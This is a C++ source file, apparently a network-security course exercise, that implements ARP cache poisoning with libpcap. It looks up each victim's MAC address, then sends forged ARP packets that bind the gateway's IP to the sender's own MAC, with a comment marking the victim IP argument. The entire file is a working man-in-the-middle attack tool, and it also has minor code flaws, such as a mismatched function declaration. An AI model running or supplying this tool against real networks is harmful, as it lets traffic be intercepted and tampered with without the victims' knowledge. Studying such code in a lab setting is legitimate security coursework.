#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"

//include for MAC
#include <iostream>
#include <cstdlib>
#include <string>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>

#define MAC_ADDR_LEN 6

#pragma pack(push, 1)
struct EthArpPacket final {
        EthHdr eth_;
        ArpHdr arp_;
};
#pragma pack(pop)

Mac myMac(char* interfaceName);
Ip myIp(char* interfaceName);
Mac getSMC(Ip sip, const std::string& interfaceName, Mac myMacAddress, Ip myIp);
EthArpPacket Make_packet(char* interfaceName, Mac my_mac, Ip sip, Ip tip, Ip my_ip);


Mac myMac(char* interfaceName){
    int fd;
    struct ifreq ifr;
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, interfaceName, IFNAMSIZ-1);
    ioctl(fd, SIOCGIFHWADDR, &ifr);
    close(fd);
    Mac Mac_address = (uint8_t*)ifr.ifr_hwaddr.sa_data;
    return Mac_address;
}

Ip myIp(char* interfaceName){
    int sock;
    struct ifreq ifr;
    uint32_t ip_address;

    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0){
        std::cout << "Socket error" << std::endl;
    }
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy((char*)ifr.ifr_name, interfaceName, IFNAMSIZ - 1);

    ioctl(sock, SIOCGIFADDR, &ifr);

    close(sock);

    ip_address = ntohl((((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr).s_addr);

    return ip_address;
}



// get Sender Mac automation
// send arp request to sender
// then, can receive sender Mac Addr
Mac getSMAC(Ip sip, const std::string& interfaceName, Mac myMacAddress, Ip myIp){

        Mac sender_mac;
        char errbuf[PCAP_ERRBUF_SIZE];
                //패킷을 받기 위함
        pcap_t* handle = pcap_open_live(interfaceName.c_str(), BUFSIZ, 1, 1, errbuf);

        EthArpPacket normal_packet;
        // 이 부분도 Make_Packet써서 줄이면 좋을듯
        // 근데 이렇게 하자니 Make_Pakcet에서 getSMAC을 써서 이건좀 다시 엎어야할듯
        normal_packet.eth_.dmac_ = Mac::broadcastMac();         // 브로드 캐스트로 뿌림(상대방의 mac을 정확하게 모르기 때문)
        normal_packet.eth_.smac_ = myMacAddress;           // 라우팅용
        normal_packet.eth_.type_ = htons(EthHdr::Arp);          // Arp로 보냄

        //ARP헤더 세팅
        normal_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        normal_packet.arp_.pro_ = htons(EthHdr::Ip4);
        normal_packet.arp_.hln_ = Mac::SIZE;
        normal_packet.arp_.pln_ = Ip::SIZE;
        normal_packet.arp_.op_ = htons(ArpHdr::Request);

        //이 부분을 보고 테이블을 갱신
        normal_packet.arp_.smac_ = myMacAddress;           //나는 누구요
        normal_packet.arp_.sip_ = htonl(myIp);               // 나는 누구요 (내 ip주소)
        normal_packet.arp_.tmac_ = Mac::nullMac();    // mac을 모름
        normal_packet.arp_.tip_ = htonl(sip);         // Sender ip주소

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&normal_packet), sizeof(EthArpPacket));
        if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }
                else {
                        struct pcap_pkthdr* header;
                        const u_char* packet;
                        res = pcap_next_ex(handle, &header, &packet);
                        if (res == 1) {
                                // 패킷 수신에 성공한 경우, ARP 응답 패킷에서 해당 IP 주소의 MAC 주소를 추출합니다.
                                EthArpPacket* arpResponsePacket = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(packet));
                                sender_mac = arpResponsePacket->arp_.smac_;
                        }
                }
        pcap_close(handle);
        return sender_mac;
    }

void usage() {
    std::cout << "syntax: send-arp-test <interface>\n";
    std::cout << "sample: send-arp-test wlan0\n";
}

//변조MAC생성
EthArpPacket Make_packet(char* interfaceName,
                         Mac my_mac,
                         Ip sip,
                         Ip tip,
                         Ip my_ip) {
    
    EthArpPacket packet;

    char errbuf[PCAP_ERRBUF_SIZE];
    Mac macAddress = myMac(interfaceName);
    Mac SenderMac = getSMAC(sip,interfaceName,my_mac,my_ip);
    packet.eth_.dmac_ = SenderMac; //Sender MAC
    packet.eth_.smac_ = Mac(my_mac); //내 MAC
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(my_mac); //내 MAC
    packet.arp_.sip_ = htonl(tip); //gateway ip , Input
    packet.arp_.tmac_ = SenderMac; //sender MAC
    packet.arp_.tip_ = htonl(sip); //sender IP

    return packet;
}

void send_packet(pcap_t* handle,EthArpPacket packet){
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        } 
}

int main(int argc, char* argv[]) {
        if (argc >= 12) {
                usage();
                return -1;
        }        
        char* dev = argv[1]; //네트워크 인터페이스 명
        char errbuf[PCAP_ERRBUF_SIZE];

        Mac my_mac;
        Ip my_ip;

        my_mac = myMac(dev);
        my_ip = myIp(dev);

        pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
                fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
                return -1;
        }
        
        for(int i=2; i<argc-1; i+=2){
        /*
        argv[1] = network_interface name
        argv[i] = vitcim ip
        argv[i+1] = gateway ip
        */
            std::string sender_ip = argv[i];
            std::string target_ip = argv[i+1];
            EthArpPacket packet = Make_packet(dev , my_mac ,Ip(sender_ip),Ip(target_ip),my_ip);
            send_packet(handle,packet);
        }
        pcap_close(handle);
}
       
